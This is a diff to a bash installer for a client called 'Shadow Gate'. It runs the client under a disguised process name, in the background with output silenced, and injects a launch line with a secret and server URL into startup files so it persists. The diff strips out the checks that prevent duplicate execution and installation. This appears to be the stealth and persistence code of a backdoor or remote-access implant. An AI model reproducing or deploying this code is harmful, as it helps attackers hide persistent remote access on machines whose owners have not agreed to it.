@@ -239,12 +239,6 @@ download_binary() {
 }
 
 exec_hidden() {
-	# Check if client is already running to prevent double execution
-	if pgrep -f "${PROC_HIDDEN_NAME}" >/dev/null 2>&1; then
-		print_debug "Client already running with process name: ${PROC_HIDDEN_NAME}"
-		return 0
-	fi
-	
 	# Validate required variables
 	if [[ -z "${SECRET}" ]]; then
 		print_error "Missing required SECRET environment variable"
@@ -273,23 +267,13 @@ install_init_scripts() {
 		return 1
 	fi
 	
-	# Check if Shadow Gate with same process name is already installed
-	for target in "${inject_targets[@]}"; do
-		[[ ! -f "$target" ]] && continue
-		if grep -q "${PROC_HIDDEN_NAME}" "$target" &>"$ERR_LOG"; then
-			print_status "!! WARNING !! Shadow Gate client with process name '${PROC_HIDDEN_NAME}' already installed via $(basename "$target")"
-			print_status "Installation aborted to prevent conflicts"
-			return 1
-		fi
-	done
+
 	
 	# Build environment variables string
 	local env_vars="SECRET='${SECRET}'"
 	[[ -n "${SERVER_URL}" ]] && env_vars="${env_vars} SERVER_URL='${SERVER_URL}'"
 	INJECT_LINE="
-if ! pgrep -f '${PROC_HIDDEN_NAME}' >/dev/null 2>&1; then
-	set +m; HOME=$HOME ${env_vars} $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${CLIENT_PATH}\" &>/dev/null &
-fi"
+set +m; HOME=$HOME ${env_vars} $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${CLIENT_PATH}\" &>/dev/null &"
 	
 	for target in "${inject_targets[@]}"; do
 		[[ ! -f "$target" ]] && continue
